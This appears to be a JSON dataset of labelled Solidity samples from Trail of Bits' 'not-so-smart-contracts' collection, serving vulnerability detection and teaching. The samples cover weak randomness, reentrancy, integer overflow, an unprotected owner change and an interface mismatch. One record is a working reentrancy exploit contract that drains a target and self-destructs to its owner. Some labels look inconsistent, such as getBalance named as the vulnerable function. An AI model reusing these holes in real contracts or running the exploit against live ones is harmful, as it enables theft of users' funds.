[
  {
    "id": "notso_bad_randomness_therun",
    "source_dataset": "not-so-smart-contracts",
    "language": "solidity",
    "chain": "evm",
    "file_name": "theRun.sol",
    "file_content": "contract theRun {\n        uint private Balance = 0;\n        uint private Payout_id = 0;\n        uint private Last_Payout = 0;\n        uint private WinningPot = 0;\n        uint private Min_multiplier = 1100; //110%\n        \n\n        //Fees are necessary and set very low, to maintain the website. The fees will decrease each time they are collected.\n        //Fees are just here to maintain the website at beginning, and will progressively go to 0% :)\n        uint private fees = 0;\n        uint private feeFrac = 20; //Fraction for fees in per\"thousand\", not percent, so 20 is 2%\n        \n        uint private PotFrac = 30; //For the WinningPot ,30=> 3% are collected. This is fixed.\n        \n        \n        address private admin;\n        \n        function theRun() {\n            admin = msg.sender;\n        }\n\n        modifier onlyowner {if (msg.sender == admin) _;  }\n\n        struct Player {\n            address addr;\n            uint payout;\n            bool paid;\n        }\n\n        Player[] private players;\n\n        //--Fallback function\n        function() {\n            init();\n        }\n\n        //--initiated function\n        function init() private {\n            uint deposit=msg.value;\n            if (msg.value < 500 finney) { //only participation with >1 ether accepted\n                    msg.sender.send(msg.value);\n                    return;\n            }\n            if (msg.value > 20 ether) { //only participation with <20 ether accepted\n                    msg.sender.send(msg.value- (20 ether));\n                    deposit=20 ether;\n            }\n            Participate(deposit);\n        }\n\n        //------- Core of the game----------\n        function Participate(uint deposit) private {\n                //calculate the multiplier to apply to the future payout\n                \n\n                uint total_multiplier=Min_multiplier; //initiate total_multiplier\n                if(Balance < 1 ether && players.length>1){\n                    total_multiplier+=100; // + 10 %\n                }\n                if( (players.length % 10)==0 && players.length>1 ){ //Every 10th participant gets a 10% bonus, play smart !\n                    total_multiplier+=100; // + 10 %\n                }\n                \n                //add new player in the queue !\n                players.push(Player(msg.sender, (deposit * total_multiplier) / 1000, false));\n                \n                //--- UPDATING CONTRACT STATS ----\n                WinningPot += (deposit * PotFrac) / 1000; // take some 3% to add for the winning pot !\n                fees += (deposit * feeFrac) / 1000; // collect maintenance fees 2%\n                Balance += (deposit * (1000 - ( feeFrac + PotFrac ))) / 1000; // update balance\n\n                // Winning the Pot :) Condition : paying at least 1 people with deposit > 2 ether and having luck !\n                if(  ( deposit > 1 ether ) && (deposit > players[Payout_id].payout) ){ \n                    uint roll = random(100); //take a random number between 1 & 100\n                    if( roll % 10 == 0 ){ //if lucky : Chances : 1 out of 10 ! \n                        msg.sender.send(WinningPot); // Bravo !\n                        WinningPot=0;\n                    }\n                    \n                }\n                \n                //Classic payout for the participants\n                while ( Balance > players[Payout_id].payout ) {\n                    Last_Payout = players[Payout_id].payout;\n                    players[Payout_id].addr.send(Last_Payout); //pay the man, please !\n                    Balance -= players[Payout_id].payout; //update the balance\n                    players[Payout_id].paid=true;\n                    \n                    Payout_id += 1;\n                }\n        }\n\n\n\n    uint256 constant private salt =  block.timestamp;\n    \n    function random(uint Max) constant private returns (uint256 result){\n        //get the best seed for randomness\n        uint256 x = salt * 100 / Max;\n        uint256 y = salt * block.number / (salt % 5) ;\n        uint256 seed = block.number/3 + (salt % 300) + Last_Payout +y; \n        uint256 h = uint256(block.blockhash(seed)); \n    \n        return uint256((h / x)) % Max + 1; //random number between 1 and Max\n    }\n    \n    \n\n    //---Contract management functions\n    function ChangeOwnership(address _owner) onlyowner {\n        admin = _owner;\n    }\n    function WatchBalance() constant returns(uint TotalBalance) {\n        TotalBalance = Balance /  1 wei;\n    }\n    \n    function WatchBalanceInEther() constant returns(uint TotalBalanceInEther) {\n        TotalBalanceInEther = Balance /  1 ether;\n    }\n    \n    \n    //Fee functions for creator\n    function CollectAllFees() onlyowner {\n        if (fees == 0) throw;\n        admin.send(fees);\n        feeFrac-=1;\n        fees = 0;\n    }\n    \n    function GetAndReduceFeesByFraction(uint p) onlyowner {\n        if (fees == 0) feeFrac-=1; //Reduce fees.\n        admin.send(fees / 1000 * p);//send a percent of fees\n        fees -= fees / 1000 * p;\n    }\n        \n\n//---Contract informations\nfunction NextPayout() constant returns(uint NextPayout) {\n    NextPayout = players[Payout_id].payout /  1 wei;\n}\n\nfunction WatchFees() constant returns(uint CollectedFees) {\n    CollectedFees = fees / 1 wei;\n}\n\n\nfunction WatchWinningPot() constant returns(uint WinningPot) {\n    WinningPot = WinningPot / 1 wei;\n}\n\nfunction WatchLastPayout() constant returns(uint payout) {\n    payout = Last_Payout;\n}\n\nfunction Total_of_Players() constant returns(uint NumberOfPlayers) {\n    NumberOfPlayers = players.length;\n}\n\nfunction PlayerInfo(uint id) constant returns(address Address, uint Payout, bool UserPaid) {\n    if (id <= players.length) {\n        Address = players[id].addr;\n        Payout = players[id].payout / 1 wei;\n        UserPaid=players[id].paid;\n    }\n}\n\nfunction PayoutQueueSize() constant returns(uint QueueSize) {\n    QueueSize = players.length - Payout_id;\n}\n\n\n}\n",
    "vulnerable_function": "theRun",
    "vulnerable_lines": [],
    "vulnerability_type": "weak_randomness",
    "category": "bad_randomness",
    "severity": "low",
    "difficulty_tier": 1,
    "description": "# Bad Randomness",
    "fix_description": "",
    "references": [
      "https://eprint.iacr.org/2018/601.pdf",
      "https://github.com/randao/randao"
    ],
    "is_vulnerable": true,
    "has_remediation": false,
    "context_level": "single_file",
    "original_source_path": "bad_randomness/theRun_source_code/theRun.sol",
    "pragma": "unknown",
    "source": "Trail of Bits"
  },
  {
    "id": "notso_reentrancy_reentrancy",
    "source_dataset": "not-so-smart-contracts",
    "language": "solidity",
    "chain": "evm",
    "file_name": "Reentrancy.sol",
    "file_content": "pragma solidity ^0.4.15;\n\ncontract Reentrance {\n    mapping (address => uint) userBalance;\n   \n    function getBalance(address u) constant returns(uint){\n        return userBalance[u];\n    }\n\n    function addToBalance() payable{\n        userBalance[msg.sender] += msg.value;\n    }   \n\n    function withdrawBalance(){\n        // send userBalance[msg.sender] ethers to msg.sender\n        // if mgs.sender is a contract, it will call its fallback function\n        if( ! (msg.sender.call.value(userBalance[msg.sender])() ) ){\n            throw;\n        }\n        userBalance[msg.sender] = 0;\n    }   \n\n    function withdrawBalance_fixed(){\n        // to protect against re-entrancy, the state variable\n        // has to be change before the call\n        uint amount = userBalance[msg.sender];\n        userBalance[msg.sender] = 0;\n        if( ! (msg.sender.call.value(amount)() ) ){\n            throw;\n        }\n    }   \n\n    function withdrawBalance_fixed_2(){\n        // send() and transfer() are safe against reentrancy\n        // they do not transfer the remaining gas\n        // and they give just enough gas to execute few instructions    \n        // in the fallback function (no further call possible)\n        msg.sender.transfer(userBalance[msg.sender]);\n        userBalance[msg.sender] = 0;\n    }   \n   \n}\n\n",
    "vulnerable_function": "getBalance",
    "vulnerable_lines": [],
    "vulnerability_type": "reentrancy",
    "category": "reentrancy",
    "severity": "high",
    "difficulty_tier": 1,
    "description": "# Re-entrancy\nA state variable is changed after a contract uses `call.value`. The attacker uses\n[a fallback function](ReentrancyExploit.sol#L26-L33)\u2014which is automatically executed after\nEther is transferred from the targeted contract\u2014to execute the vulnerable function again, *before* the\nstate variable is changed.",
    "fix_description": "",
    "references": [
      "http://hackingdistributed.com/2016/06/18/analysis-of-the-dao-exploit/",
      "https://medium.com/spankchain/we-got-spanked-what-we-know-so-far-d5ed3a0f38fe"
    ],
    "is_vulnerable": true,
    "has_remediation": true,
    "context_level": "single_file",
    "original_source_path": "reentrancy/Reentrancy.sol",
    "pragma": "^0.4.15",
    "source": "Trail of Bits"
  },
  {
    "id": "notso_reentrancy_reentrancyexploit",
    "source_dataset": "not-so-smart-contracts",
    "language": "solidity",
    "chain": "evm",
    "file_name": "ReentrancyExploit.sol",
    "file_content": "pragma solidity ^0.4.15;\n\ncontract ReentranceExploit {\n    bool public attackModeIsOn=false; \n    address public vulnerable_contract;\n    address public owner;\n\n    function ReentranceExploit() public{\n        owner = msg.sender;\n    }\n\n    function deposit(address _vulnerable_contract) public payable{\n        vulnerable_contract = _vulnerable_contract ;\n        // call addToBalance with msg.value ethers\n        require(vulnerable_contract.call.value(msg.value)(bytes4(sha3(\"addToBalance()\"))));\n    }\n\n    function launch_attack() public{\n        attackModeIsOn = true;\n        // call withdrawBalance\n        // withdrawBalance calls the fallback of ReentranceExploit\n        require(vulnerable_contract.call(bytes4(sha3(\"withdrawBalance()\"))));\n    }  \n\n\n    function () public payable{\n        // atackModeIsOn is used to execute the attack only once\n        // otherwise there is a loop between withdrawBalance and the fallback function\n        if (attackModeIsOn){\n            attackModeIsOn = false;\n                require(vulnerable_contract.call(bytes4(sha3(\"withdrawBalance()\"))));\n        }\n    }\n\n    function get_money(){\n        suicide(owner);\n    }\n\n}\n",
    "vulnerable_function": "ReentranceExploit",
    "vulnerable_lines": [],
    "vulnerability_type": "reentrancy",
    "category": "reentrancy",
    "severity": "high",
    "difficulty_tier": 1,
    "description": "# Re-entrancy\nA state variable is changed after a contract uses `call.value`. The attacker uses\n[a fallback function](ReentrancyExploit.sol#L26-L33)\u2014which is automatically executed after\nEther is transferred from the targeted contract\u2014to execute the vulnerable function again, *before* the\nstate variable is changed.",
    "fix_description": "",
    "references": [
      "http://hackingdistributed.com/2016/06/18/analysis-of-the-dao-exploit/",
      "https://medium.com/spankchain/we-got-spanked-what-we-know-so-far-d5ed3a0f38fe"
    ],
    "is_vulnerable": true,
    "has_remediation": false,
    "context_level": "single_file",
    "original_source_path": "reentrancy/ReentrancyExploit.sol",
    "pragma": "^0.4.15",
    "source": "Trail of Bits"
  },
  {
    "id": "notso_integer_overflow_integer_overflow_1",
    "source_dataset": "not-so-smart-contracts",
    "language": "solidity",
    "chain": "evm",
    "file_name": "integer_overflow_1.sol",
    "file_content": "pragma solidity ^0.4.15;\n\ncontract Overflow {\n    uint private sellerBalance=0;\n    \n    function add(uint value) returns (bool){\n        sellerBalance += value; // possible overflow\n\n        // possible auditor assert\n        // assert(sellerBalance >= value); \n    } \n\n    function safe_add(uint value) returns (bool){\n        require(value + sellerBalance >= sellerBalance);\n        sellerBalance += value; \n    } \n}\n",
    "vulnerable_function": "add",
    "vulnerable_lines": [],
    "vulnerability_type": "integer_issues",
    "category": "integer_overflow",
    "severity": "high",
    "difficulty_tier": 1,
    "description": "# Integer Overflow",
    "fix_description": "",
    "references": [
      "https://github.com/OpenZeppelin/openzeppelin-solidity/blob/master/contracts/math/SafeMath.sol",
      "https://github.com/Arachnid/uscc/tree/master/submissions-2017/doughoyte"
    ],
    "is_vulnerable": true,
    "has_remediation": false,
    "context_level": "single_file",
    "original_source_path": "integer_overflow/integer_overflow_1.sol",
    "pragma": "^0.4.15",
    "source": "Trail of Bits"
  },
  {
    "id": "notso_unprotected_function_unprotected",
    "source_dataset": "not-so-smart-contracts",
    "language": "solidity",
    "chain": "evm",
    "file_name": "Unprotected.sol",
    "file_content": "pragma solidity ^0.4.15;\n\ncontract Unprotected{\n    address private owner;\n\n    modifier onlyowner {\n        require(msg.sender==owner);\n        _;\n    }\n\n    function Unprotected()\n        public \n    {\n        owner = msg.sender;\n    }\n\n    // This function should be protected\n    function changeOwner(address _newOwner) \n        public\n    {\n       owner = _newOwner;\n    }\n\n    function changeOwner_fixed(address _newOwner) \n        public \n        onlyowner\n    {\n       owner = _newOwner;\n    }\n}\n",
    "vulnerable_function": "Unprotected",
    "vulnerable_lines": [],
    "vulnerability_type": "access_control",
    "category": "unprotected_function",
    "severity": "high",
    "difficulty_tier": 1,
    "description": "# Unprotected function\nMissing (or incorrectly used) modifier on a function allows an attacker to use sensitive functionality in the contract.",
    "fix_description": "",
    "references": [
      "https://etherscan.io/address/0xe82719202e5965Cf5D9B6673B7503a3b92DE20be#code",
      "https://blog.zeppelin.solutions/on-the-parity-wallet-multisig-hack-405a8c12e8f7",
      "https://github.com/BitGo/eth-multisig-v2/commit/8042188f08c879e06f097ae55c140e0aa7baaff8#diff-b498cc6fd64f83803c260abd8de0a8f5",
      "https://medium.com/nexus-mutual/responsible-vulnerability-disclosure-ece3fe3bcefa"
    ],
    "is_vulnerable": true,
    "has_remediation": true,
    "context_level": "single_file",
    "original_source_path": "unprotected_function/Unprotected.sol",
    "pragma": "^0.4.15",
    "source": "Trail of Bits"
  },
  {
    "id": "notso_incorrect_interface_alice",
    "source_dataset": "not-so-smart-contracts",
    "language": "solidity",
    "chain": "evm",
    "file_name": "Alice.sol",
    "file_content": "\npragma solidity ^0.4.15;\n\ncontract Alice { \n    int public val;\n\n    function set(int new_val){\n        val = new_val;\n    }\n\n    function set_fixed(int new_val){\n        val = new_val;\n    }\n\n    function(){\n        val = 1;\n    }\n}\n",
    "vulnerable_function": "set",
    "vulnerable_lines": [],
    "vulnerability_type": "interface_mismatch",
    "category": "incorrect_interface",
    "severity": "low",
    "difficulty_tier": 1,
    "description": "# Incorrect interface\nA contract interface defines functions with a different type signature than the implementation, causing two different method id's to be created.\nAs a result, when the interfact is called, the fallback method will be executed.",
    "fix_description": "",
    "references": [],
    "is_vulnerable": true,
    "has_remediation": true,
    "context_level": "single_file",
    "original_source_path": "incorrect_interface/Alice.sol",
    "pragma": "^0.4.15",
    "source": "Trail of Bits"
  }
]